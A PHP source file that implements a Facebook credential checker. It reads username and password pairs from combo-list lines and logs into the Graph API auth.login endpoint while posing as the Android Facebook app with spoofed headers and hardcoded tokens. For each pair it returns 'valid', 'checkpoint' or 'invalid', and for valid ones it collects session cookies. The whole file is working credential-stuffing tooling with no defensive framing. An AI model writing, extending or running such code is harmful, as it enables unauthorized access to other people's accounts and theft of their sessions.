<?php
declare(strict_types=1);

const FB_GRAPH_LOGIN = 'https://graph.facebook.com/auth/login';
const FB_ACCESS_TOKEN = '350685531728|62f8ce9f74b12f84c123cc23437a4a32';
const FB_API_KEY = '882a8490361da98702bf97a021ddc14d';
const FB_SESSION_ID = 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62';
const FB_CONNECTION_TOKEN = 'd29d67d37eca387482a8a5b740f84f62';

function fbUuid(): string
{
    $b = random_bytes(16);
    $b[6] = chr((ord($b[6]) & 0x0f) | 0x40);
    $b[8] = chr((ord($b[8]) & 0x3f) | 0x80);
    $h = bin2hex($b);
    return substr($h, 0, 8) . '-' . substr($h, 8, 4) . '-' . substr($h, 12, 4) . '-' . substr($h, 16, 4) . '-' . substr($h, 20, 12);
}

function fbRandomString(int $length = 24): string
{
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';
    $out = '';
    $max = strlen($chars) - 1;
    for ($i = 0; $i < $length; $i++) {
        $out .= $chars[random_int(0, $max)];
    }
    return $out;
}

function fbUserAgent(): string
{
    return 'Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ3A.230805.001) [FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.625,width=1080,height=2400};FBLC/en_US;FBRV/492627149;FBCR/T-Mobile;FBMF/Google;FBBD/Google;FBPN/com.facebook.katana;FBDV/Pixel 7;FBSV/13;FBOP/1;FBCA/arm64-v8a;]';
}

function fbParseCredentialLine(string $line): ?array
{
    $line = trim($line);
    if ($line === '' || str_starts_with($line, '#')) {
        return null;
    }
    if (stripos($line, 'username') !== false && stripos($line, 'password') !== false) {
        return null;
    }
    if (str_contains($line, '|')) {
        $parts = array_values(array_filter(array_map('trim', explode('|', $line)), static fn($x) => $x !== ''));
        if (count($parts) >= 2) {
            return [$parts[0], $parts[1]];
        }
    }
    $parts = preg_split('/\s+/', $line);
    $parts = array_values(array_filter($parts, static fn($x) => $x !== ''));
    if (count($parts) >= 3) {
        return [$parts[1], $parts[2]];
    }
    if (count($parts) === 2) {
        return [$parts[0], $parts[1]];
    }
    return null;
}

function fbAttempt(string $username, string $password): array
{
    $hni = (string) random_int(10000, 99999);
    $headers = [
        'User-Agent: ' . fbUserAgent(),
        'Content-Type: application/x-www-form-urlencoded',
        'Host: graph.facebook.com',
        'X-FB-Net-HNI: ' . $hni,
        'X-FB-SIM-HNI: ' . $hni,
        'X-FB-Connection-Type: unknown',
        'X-Tigon-Is-Retry: False',
        'x-fb-session-id: ' . FB_SESSION_ID,
        'x-fb-device-group: 5120',
        'X-FB-Friendly-Name: authenticate',
        'X-FB-Request-Analytics-Tags: graphservice',
        'Accept-Encoding: gzip, deflate',
        'X-FB-HTTP-Engine: Liger',
        'X-FB-Client-IP: True',
        'X-FB-Server-Cluster: True',
        'x-fb-connection-token: ' . FB_CONNECTION_TOKEN,
        'Connection: Keep-Alive',
    ];

    $data = [
        'adid' => fbUuid(),
        'format' => 'json',
        'device_id' => fbUuid(),
        'cpl' => 'true',
        'family_device_id' => fbUuid(),
        'credentials_type' => 'device_based_login_password',
        'error_detail_type' => 'button_with_disabled',
        'source' => 'device_based_login',
        'email' => $username,
        'password' => $password,
        'access_token' => FB_ACCESS_TOKEN,
        'generate_session_cookies' => '1',
        'meta_inf_fbmeta' => '',
        'advertiser_id' => fbUuid(),
        'currently_logged_in_userid' => '0',
        'locale' => 'en_US',
        'client_country_code' => 'US',
        'method' => 'auth.login',
        'fb_api_req_friendly_name' => 'authenticate',
        'fb_api_caller_class' => 'com.facebook.account.login.protocol.Fb4aAuthHandler',
        'api_key' => FB_API_KEY,
    ];

    $ch = curl_init(FB_GRAPH_LOGIN);
    if ($ch === false) {
        return ['status' => 'error', 'message' => 'curl init failed', 'http' => 0, 'cookie' => null];
    }
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data),
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_TIMEOUT => 20,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
        CURLOPT_ENCODING => '',
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    ]);
    $raw = curl_exec($ch);
    $errno = curl_errno($ch);
    $error = curl_error($ch);
    $http = (int) curl_getinfo($ch, CURLINFO_RESPONSE_CODE);

    if ($raw === false || $errno !== 0) {
        return ['status' => 'error', 'message' => 'network: ' . $error, 'http' => $http, 'cookie' => null];
    }

    $body = json_decode($raw, true);
    $body = is_array($body) ? $body : null;
    $hasSession = (is_array($body) && isset($body['session_key'])) || str_contains($raw, '"session_key"');
    if ($hasSession) {
        $cookies = [];
        $list = is_array($body) && is_array($body['session_cookies'] ?? null) ? $body['session_cookies'] : [];
        foreach ($list as $cookie) {
            if (is_array($cookie) && isset($cookie['name'], $cookie['value'])) {
                $cookies[] = (string) $cookie['name'] . '=' . (string) $cookie['value'];
            }
        }
        $cookie = 'sb=' . fbRandomString(24);
        if ($cookies !== []) {
            $cookie .= ';' . implode(';', $cookies);
        }
        return ['status' => 'valid', 'message' => 'session_key received', 'http' => $http, 'cookie' => $cookie];
    }

    if (str_contains($raw, 'User must verify their account')) {
        return ['status' => 'checkpoint', 'message' => 'User must verify their account', 'http' => $http, 'cookie' => null];
    }

    $message = '';
    if (is_array($body)) {
        $err = $body['error'] ?? null;
        if (is_array($err)) {
            $message = (string) ($err['error_user_msg'] ?? $err['message'] ?? '');
        } elseif (is_string($err)) {
            $message = $err;
        }
    }
    if ($message === '') {
        $message = $http >= 500 ? 'Facebook HTTP ' . $http : 'Invalid credentials';
    }
    $status = $http >= 500 ? 'error' : 'invalid';
    return ['status' => $status, 'message' => $message, 'http' => $http, 'cookie' => null];
}

function fbCheckCredential(string $username, string $password): array
{
    $result = fbAttempt($username, $password);
    return [
        'username' => $username,
        'password' => $password,
        'status' => $result['status'],
        'cookie' => $result['cookie'],
        'message' => $result['message'],
        'http' => $result['http'],
    ];
}
